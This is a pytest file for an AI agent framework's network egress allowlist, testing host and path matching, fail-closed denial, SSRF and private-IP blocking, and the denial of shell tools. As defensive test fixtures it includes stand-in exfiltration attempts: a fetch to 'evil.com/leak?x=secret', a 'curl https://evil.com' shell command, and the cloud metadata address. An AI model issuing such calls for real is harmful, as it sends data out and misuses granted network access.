"""Tests for the per-run egress allowlist (ADR 0003 §3c, AC-2, Inc 5).

Two layers, mirroring the tool allowlist:
  * NetworkPolicy.check — the matching engine (host glob, path prefix,
    fail-closed). Unit-tested here directly.
  * ScopedToolManager egress chokepoint — a granted but network-capable
    tool is checked against the policy at execute_tool BEFORE its request
    fires; a denied target returns a model-readable error and the handler
    NEVER runs. This is the AC-2 invariant.
"""

from __future__ import annotations

import pytest

from ppxai.engine.tools.network_policy import (
    Allow,
    Deny,
    NetworkPolicy,
    is_network_tool,
    tool_targets,
)
from ppxai.engine.agent_scoped_tools import ScopedToolManager

# The autouse `_no_dns` fixture patches `_host_resolves_to_blocked_ip` to a
# no-op for hermetic host-matching tests. The cache tests below exercise the
# REAL implementation, so they restore it from this import-time reference
# (captured before any fixture runs).
import ppxai.engine.tools.network_policy as _np_mod
_REAL_HOST_RESOLVES = _np_mod._host_resolves_to_blocked_ip


@pytest.fixture(autouse=True)
def _no_dns(monkeypatch):
    """Make NetworkPolicy.check hermetic by default (v1.19.0 Item 37f).

    check() now resolves an allowlisted host and denies it if it maps to a
    loopback/private IP (SSRF guard). That would make every host-matching
    unit test depend on live DNS. Default the resolver to "not blocked" so
    matching tests are deterministic + offline; the dedicated SSRF tests
    (TestSsrfGuard) patch it explicitly to exercise the block.
    """
    import ppxai.engine.tools.network_policy as np

    monkeypatch.setattr(np, "_host_resolves_to_blocked_ip", lambda host: False)


# ---------------------------------------------------------------------------
# NetworkPolicy.check — host matching
# ---------------------------------------------------------------------------


class TestHostMatching:
    def test_exact_host_allowed(self):
        p = NetworkPolicy(["api.github.com"])
        assert isinstance(p.check("https://api.github.com/repos/x"), Allow)

    def test_unlisted_host_denied(self):
        p = NetworkPolicy(["api.github.com"])
        d = p.check("https://evil.com/")
        assert isinstance(d, Deny) and "not in egress allowlist" in d.reason

    def test_glob_matches_one_label(self):
        p = NetworkPolicy([{"host": "*.wikipedia.org"}])
        assert isinstance(p.check("https://en.wikipedia.org/wiki/X"), Allow)

    def test_glob_rejects_two_labels(self):
        # single-label glob: a.b.wikipedia.org must NOT match *.wikipedia.org
        p = NetworkPolicy([{"host": "*.wikipedia.org"}])
        assert isinstance(p.check("https://a.b.wikipedia.org/wiki/X"), Deny)

    def test_glob_suffix_anchored_blocks_lookalike(self):
        # THE footgun: wikipedia.org.evil.com must NOT match *.wikipedia.org
        p = NetworkPolicy([{"host": "*.wikipedia.org"}])
        assert isinstance(p.check("https://wikipedia.org.evil.com/"), Deny)

    def test_host_case_insensitive(self):
        p = NetworkPolicy(["API.GitHub.com"])
        assert isinstance(p.check("https://api.github.com/x"), Allow)


# ---------------------------------------------------------------------------
# NetworkPolicy.check — path scoping
# ---------------------------------------------------------------------------


class TestPathScoping:
    def test_no_paths_allows_any_path(self):
        p = NetworkPolicy(["api.github.com"])
        assert isinstance(p.check("https://api.github.com/anything/at/all"), Allow)

    def test_path_prefix_match_allowed(self):
        p = NetworkPolicy([{"host": "api.github.com", "paths": ["/search/"]}])
        assert isinstance(p.check("https://api.github.com/search/code?q=x"), Allow)

    def test_path_outside_prefix_denied(self):
        p = NetworkPolicy([{"host": "api.github.com", "paths": ["/search/"]}])
        d = p.check("https://api.github.com/user/keys")
        assert isinstance(d, Deny) and "not in allowed prefixes" in d.reason

    def test_rule_id_is_index(self):
        p = NetworkPolicy(["a.com", "b.com"])
        a = p.check("https://b.com/")
        assert isinstance(a, Allow) and a.rule_id == "1"


# ---------------------------------------------------------------------------
# Fail-closed
# ---------------------------------------------------------------------------


class TestFailClosed:
    def test_empty_policy_denies_everything(self):
        p = NetworkPolicy([])
        assert p.is_empty
        assert isinstance(p.check("https://api.github.com/"), Deny)

    def test_none_policy_denies_everything(self):
        assert isinstance(NetworkPolicy(None).check("https://x.com/"), Deny)

    def test_no_target_denied(self):
        assert isinstance(NetworkPolicy(["x.com"]).check(None), Deny)
        assert isinstance(NetworkPolicy(["x.com"]).check(""), Deny)

    def test_http_scheme_denied(self):
        # MVP is https-only; an http target is denied even if host matches.
        p = NetworkPolicy(["api.github.com"])
        d = p.check("http://api.github.com/")
        assert isinstance(d, Deny) and "https only" in d.reason

    def test_malformed_rules_ignored_not_crash(self):
        # a rule with no host / wrong type is dropped, not fatal
        p = NetworkPolicy(["good.com", {"no_host": 1}, 42, {"host": ""}])
        assert isinstance(p.check("https://good.com/"), Allow)
        assert isinstance(p.check("https://other.com/"), Deny)


# ---------------------------------------------------------------------------
# tool_targets — resolving a tool call to its set of possible outbound URLs
# ---------------------------------------------------------------------------


class TestToolTargets:
    def test_fetch_url_single_target_from_kwarg(self):
        assert tool_targets("fetch_url", {"url": "https://x.com/p"}) == ["https://x.com/p"]

    def test_web_search_enumerates_all_backends(self):
        # the High-finding fix: web_search can reach DDG, Perplexity, OR Gemini
        # (call-time backend + fallback chain), so ALL are possible targets.
        targets = tool_targets("web_search", {"query": "q"})
        hosts = {t.split("/")[2] for t in targets}
        assert "duckduckgo.com" in hosts
        assert "api.perplexity.ai" in hosts
        assert "generativelanguage.googleapis.com" in hosts

    def test_get_weather_includes_http_fallback(self):
        # the Medium-finding fix: get_weather falls back https->http, so both
        # schemes are possible targets (the http one will be denied under MVP).
        targets = tool_targets("get_weather", {"location": "Geneva"})
        assert "https://wttr.in/" in targets
        assert "http://wttr.in/" in targets

    def test_fetch_url_missing_kwarg_unresolvable(self):
        # network-capable but no URL -> empty -> caller fail-closes
        assert tool_targets("fetch_url", {}) == []

    def test_non_network_tool_is_empty(self):
        assert tool_targets("read_file", {"path": "x"}) == []

    def test_is_network_tool(self):
        assert is_network_tool("fetch_url")
        assert is_network_tool("web_search")
        assert not is_network_tool("read_file")


class TestAuthorizeSupersetRule:
    """AC-2 superset: a tool is allowed only if EVERY possible target passes."""

    def test_web_search_denied_when_only_some_backends_allowed(self):
        # THE High-finding invariant: allowlisting DuckDuckGo must NOT permit
        # web_search, because the call could instead reach Perplexity/Gemini.
        p = NetworkPolicy(["duckduckgo.com", "html.duckduckgo.com"])
        d = p.authorize("web_search", {"query": "q"})
        assert d.allowed is False
        assert d.rule_id is None

    def test_web_search_allowed_when_all_backends_allowed(self):
        p = NetworkPolicy([
            "duckduckgo.com", "html.duckduckgo.com",
            "api.perplexity.ai", "generativelanguage.googleapis.com",
        ])
        d = p.authorize("web_search", {"query": "q"})
        assert d.allowed is True

    def test_approved_targets_lists_all_backends_not_just_first(self):
        # Item 37h: the audit must record EVERY approved backend, not only
        # target_host (the first), so a log doesn't claim DuckDuckGo when the
        # handler actually hit Perplexity.
        p = NetworkPolicy([
            "duckduckgo.com", "html.duckduckgo.com",
            "api.perplexity.ai", "generativelanguage.googleapis.com",
        ])
        d = p.authorize("web_search", {"query": "q"})
        assert d.allowed is True
        assert set(d.approved_targets) == {
            "duckduckgo.com", "html.duckduckgo.com",
            "api.perplexity.ai", "generativelanguage.googleapis.com",
        }
        # single-target tool: approved_targets is just that one host
        d1 = NetworkPolicy(["api.github.com"]).authorize(
            "fetch_url", {"url": "https://api.github.com/x"})
        assert d1.approved_targets == ("api.github.com",)

    def test_approved_targets_empty_on_deny(self):
        d = NetworkPolicy(["duckduckgo.com"]).authorize("web_search", {"query": "q"})
        assert d.allowed is False
        assert d.approved_targets == ()

    def test_get_weather_denied_by_http_fallback_branch(self):
        # THE Medium-finding outcome: even allowlisting wttr.in, get_weather is
        # denied because its http fallback target fails the https-only rule.
        d = NetworkPolicy(["wttr.in"]).authorize("get_weather", {"location": "x"})
        assert d.allowed is False
        assert "https only" in d.reason

    def test_fetch_url_single_target_allowed(self):
        d = NetworkPolicy(["api.github.com"]).authorize(
            "fetch_url", {"url": "https://api.github.com/x"})
        assert d.allowed is True and d.target_host == "api.github.com"

    def test_unresolvable_target_denied(self):
        d = NetworkPolicy(["x.com"]).authorize("fetch_url", {})
        assert d.allowed is False and "no resolvable target" in d.reason


# ---------------------------------------------------------------------------
# ScopedToolManager egress chokepoint — AC-2 invariant
# ---------------------------------------------------------------------------


class _NetBase:
    """Base manager whose 'network' tools record if they actually ran."""

    def __init__(self):
        self.ran = []

    async def execute_tool(self, name, **kw):
        self.ran.append((name, kw))
        return f"ran {name}"


class TestEgressChokepoint:
    @pytest.mark.asyncio
    async def test_allowed_target_executes_and_emits_allowed(self):
        base = _NetBase()
        events = []
        s = ScopedToolManager(
            base, ["fetch_url"],
            network_policy=NetworkPolicy(["api.github.com"]),
            on_network=lambda ok, p: events.append((ok, p)),
        )
        out = await s.execute_tool("fetch_url", url="https://api.github.com/x")
        assert out == "ran fetch_url"
        assert base.ran == [("fetch_url", {"url": "https://api.github.com/x"})]
        assert events and events[0][0] is True
        assert events[0][1]["target_host"] == "api.github.com"
        assert events[0][1]["allowlist_rule_id"] == "0"

    @pytest.mark.asyncio
    async def test_ac2_denied_target_never_runs_and_emits_denied(self):
        # THE AC-2 INVARIANT: an off-allowlist target does not fire.
        base = _NetBase()
        events = []
        s = ScopedToolManager(
            base, ["fetch_url"],
            network_policy=NetworkPolicy(["api.github.com"]),
            on_network=lambda ok, p: events.append((ok, p)),
        )
        out = await s.execute_tool("fetch_url", url="https://evil.com/leak?x=secret")
        assert "network access denied" in out  # model-readable
        assert base.ran == []                  # the request NEVER fired
        assert events and events[0][0] is False
        assert events[0][1]["target_host"] == "evil.com"
        assert events[0][1]["allowlist_rule_id"] is None

    @pytest.mark.asyncio
    async def test_empty_policy_denies_network_tool(self):
        # fail-closed: a granted network tool with no allowlist reaches nothing
        base = _NetBase()
        s = ScopedToolManager(
            base, ["web_search"], network_policy=NetworkPolicy([]),
        )
        out = await s.execute_tool("web_search", query="anything")
        assert "network access denied" in out
        assert base.ran == []

    @pytest.mark.asyncio
    async def test_non_network_tool_not_gated_by_policy(self):
        # read_file is granted; even with an empty egress policy it runs —
        # the policy only governs network-capable tools.
        base = _NetBase()
        s = ScopedToolManager(
            base, ["read_file"], network_policy=NetworkPolicy([]),
        )
        out = await s.execute_tool("read_file", path="x")
        assert out == "ran read_file"
        assert base.ran == [("read_file", {"path": "x"})]

    @pytest.mark.asyncio
    async def test_no_policy_means_no_egress_enforcement(self):
        # network_policy=None (the Inc 4 shape) -> network tools pass through
        base = _NetBase()
        s = ScopedToolManager(base, ["fetch_url"])  # no network_policy
        out = await s.execute_tool("fetch_url", url="https://anywhere.com/")
        assert out == "ran fetch_url"
        assert base.ran  # ran — egress enforcement is opt-in via the policy

    @pytest.mark.asyncio
    async def test_off_grant_network_tool_denied_before_policy(self):
        # grant check comes first: an off-grant tool is denied as off-grant,
        # never reaching the egress check (and never executing).
        base = _NetBase()
        netcalls = []
        s = ScopedToolManager(
            base, ["read_file"],  # fetch_url NOT granted
            network_policy=NetworkPolicy(["api.github.com"]),
            on_network=lambda ok, p: netcalls.append(p),
        )
        out = await s.execute_tool("fetch_url", url="https://api.github.com/x")
        assert "not permitted for this run" in out  # off-grant denial
        assert base.ran == []
        assert netcalls == []  # egress check never reached

    @pytest.mark.asyncio
    async def test_shell_denied_under_egress_policy_backstop(self):
        # AC-2 (security review High): a granted shell tool must NEVER execute
        # when an egress policy is active — its arbitrary commands (curl, pip,
        # Invoke-WebRequest) escape the allowlist. The /task route rejects the
        # grant up front; this is the chokepoint backstop for any other path.
        base = _NetBase()
        events = []
        s = ScopedToolManager(
            base, ["execute_shell_command"],  # even if somehow granted
            network_policy=NetworkPolicy(["api.github.com"]),
            on_network=lambda ok, p: events.append((ok, p)),
        )
        out = await s.execute_tool("execute_shell_command", command="curl https://evil.com")
        assert "not permitted" in out
        assert base.ran == []                      # shell NEVER ran
        assert events and events[0][0] is False    # emitted a denied event
        assert "shell" in events[0][1]["reason"].lower()


# ---------------------------------------------------------------------------
# Backend-coverage guard (Item 37c): _NETWORK_TOOLS must enumerate every
# host the premium web tools can actually reach. If a new web_search /
# get_weather backend is added in web_premium.py but NOT mirrored into
# _NETWORK_TOOLS, the superset rule can't see it and a run could reach an
# un-allowlisted host with NO network_policy_denied event — a silent AC-2
# regression. This test makes that drift fail in CI.
# ---------------------------------------------------------------------------
class TestBackendCoverage:
    def _allowlisted_hosts(self) -> set:
        from urllib.parse import urlparse

        from ppxai.engine.tools.network_policy import _NETWORK_TOOLS

        hosts = set()
        for kind, spec in _NETWORK_TOOLS.values():
            if kind == "fixed":
                for url in spec:
                    h = (urlparse(url).hostname or "").lower()
                    if h:
                        hosts.add(h)
        return hosts

    def test_web_premium_hosts_are_all_allowlisted(self):
        """Every https?:// host literal in web_premium.py must be covered by
        _NETWORK_TOOLS (the AC-2 superset source). Adding a backend without
        updating the allowlist fails here."""
        import re
        from pathlib import Path

        src = (
            Path(__file__).resolve().parent.parent
            / "ppxai" / "engine" / "tools" / "builtin" / "web_premium.py"
        ).read_text(encoding="utf-8")

        # Pull host out of every literal http(s) URL in the source.
        found = set()
        for m in re.finditer(r"https?://([A-Za-z0-9.\-]+)", src):
            found.add(m.group(1).lower())

        # DuckDuckGo is reached via the `ddgs` package (no URL literal in our
        # source), so it won't appear in `found`; that's expected. We assert
        # the inverse direction: every URL-literal host our code names must be
        # allowlisted. (ddgs hosts are covered explicitly in _NETWORK_TOOLS.)
        allow = self._allowlisted_hosts()

        # Hosts that are NOT egress targets of a network tool (e.g. doc-comment
        # example URLs). Keep this list tight + explained so a real new backend
        # can't hide behind it.
        IGNORE = {
            "example.com",  # docstring example in the fetch_url description
        }
        uncovered = {h for h in found if h not in allow and h not in IGNORE}
        assert not uncovered, (
            f"web_premium.py names egress host(s) not in _NETWORK_TOOLS: "
            f"{sorted(uncovered)}. Add them to the relevant tool's target list "
            f"in network_policy.py (AC-2 superset rule) or to this test's "
            f"IGNORE set if they are genuinely not egress targets."
        )

    def test_known_backends_present(self):
        """Pin the four backends the superset rule depends on today, so an
        accidental deletion from _NETWORK_TOOLS is caught explicitly."""
        allow = self._allowlisted_hosts()
        for host in (
            "duckduckgo.com",
            "html.duckduckgo.com",
            "api.perplexity.ai",
            "generativelanguage.googleapis.com",
            "wttr.in",
        ):
            assert host in allow, f"{host} missing from _NETWORK_TOOLS"


# ---------------------------------------------------------------------------
# SSRF / private-IP guard (Item 37f). An allowlisted name that resolves to a
# loopback/private/link-local address is denied; bare-scheme + http are
# rejected. NOTE: does NOT cover DNS rebinding (TOCTOU) — that needs the
# network layer (tier-d). These cover the easy misconfig / local-target hole.
# ---------------------------------------------------------------------------
class TestSsrfGuard:
    def test_allowlisted_host_resolving_to_loopback_denied(self, monkeypatch):
        import ppxai.engine.tools.network_policy as np

        monkeypatch.setattr(np, "_host_resolves_to_blocked_ip", lambda h: True)
        p = NetworkPolicy(["internal.example.com"])
        d = p.check("https://internal.example.com/")
        assert isinstance(d, Deny) and "SSRF" in d.reason

    def test_public_host_still_allowed(self, monkeypatch):
        import ppxai.engine.tools.network_policy as np

        monkeypatch.setattr(np, "_host_resolves_to_blocked_ip", lambda h: False)
        p = NetworkPolicy(["api.github.com"])
        assert isinstance(p.check("https://api.github.com/x"), Allow)

    def test_literal_loopback_ip_blocked(self):
        # _is_blocked_ip works on literals without DNS.
        from ppxai.engine.tools.network_policy import _is_blocked_ip
        assert _is_blocked_ip("127.0.0.1")
        assert _is_blocked_ip("169.254.169.254")  # cloud metadata endpoint
        assert _is_blocked_ip("10.0.0.5")
        assert _is_blocked_ip("::1")
        assert not _is_blocked_ip("8.8.8.8")
        assert not _is_blocked_ip("not-an-ip")

    def test_http_scheme_denied(self):
        p = NetworkPolicy(["wttr.in"])
        d = p.check("http://wttr.in/")
        assert isinstance(d, Deny) and "https only" in d.reason

    def test_empty_scheme_denied(self):
        # v1.19.0 Item 37f: a bare/scheme-relative target is no longer accepted.
        p = NetworkPolicy(["api.github.com"])
        d = p.check("//api.github.com/x")
        assert isinstance(d, Deny) and "https only" in d.reason

    def test_resolution_failure_does_not_block(self, monkeypatch):
        # A transient DNS failure must NOT deny a legitimately allowlisted host
        # (the connect will fail anyway). _host_resolves_to_blocked_ip returns
        # False on resolution error.
        import ppxai.engine.tools.network_policy as np

        np._resolve_cache.clear()

        def boom(host, *a, **k):
            raise OSError("dns down")

        monkeypatch.setattr(np.socket, "getaddrinfo", boom)
        assert np._host_resolves_to_blocked_ip("api.github.com") is False

    def test_resolution_memoized_within_ttl(self, monkeypatch):
        # Gemini #1: repeated checks for the same host do at most ONE DNS lookup
        # within the TTL window — so the sync lookup can't accumulate into
        # event-loop blocking across a run's many tool calls.
        import ppxai.engine.tools.network_policy as np

        monkeypatch.setattr(np, "_host_resolves_to_blocked_ip", _REAL_HOST_RESOLVES)
        np._resolve_cache.clear()
        calls = {"n": 0}

        def counting(host, *a, **k):
            calls["n"] += 1
            return [(None, None, None, None, ("8.8.8.8", 0))]

        monkeypatch.setattr(np.socket, "getaddrinfo", counting)
        for _ in range(5):
            assert _REAL_HOST_RESOLVES("repeat.example.com") is False
        assert calls["n"] == 1  # resolved once, then served from cache

    def test_failure_is_not_cached(self, monkeypatch):
        # A resolution failure must NOT be cached (retry next call) — only a
        # successful verdict is memoized.
        import ppxai.engine.tools.network_policy as np

        np._resolve_cache.clear()
        calls = {"n": 0}

        def boom(host, *a, **k):
            calls["n"] += 1
            raise OSError("dns down")

        monkeypatch.setattr(np.socket, "getaddrinfo", boom)
        _REAL_HOST_RESOLVES("flaky.example.com")
        _REAL_HOST_RESOLVES("flaky.example.com")
        assert calls["n"] == 2  # each call retried; nothing cached

    def test_literal_ip_not_cached(self):
        # A direct IP literal is decided without DNS and must not populate the
        # cache (it's a name→ip cache).
        import ppxai.engine.tools.network_policy as np

        np._resolve_cache.clear()
        assert _REAL_HOST_RESOLVES("127.0.0.1") is True
        assert "127.0.0.1" not in np._resolve_cache
